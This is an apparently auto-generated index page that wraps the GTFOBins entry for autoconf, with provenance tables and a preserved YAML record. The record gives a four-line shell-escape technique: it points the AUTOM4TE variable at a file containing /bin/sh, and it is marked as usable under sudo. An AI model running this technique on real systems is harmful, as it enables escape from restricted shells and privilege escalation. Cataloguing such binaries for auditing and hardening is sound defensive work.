---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# autoconf

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `autoconf` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoconf` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [autoconf](../../tools/linux/autoconf.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | autoconf |
| name | autoconf |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/autoconf/ |

## Preserved Source Material

```yaml
_body: ''
_name: autoconf
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/autoconf
functions:
  shell:
  - code: 'echo /bin/sh >/path/to/temp-file

      chmod +x /path/to/temp-file

      touch configure.ac

      AUTOM4TE=/path/to/temp-file autoconf'
    contexts:
      sudo: null
      unprivileged: null
```
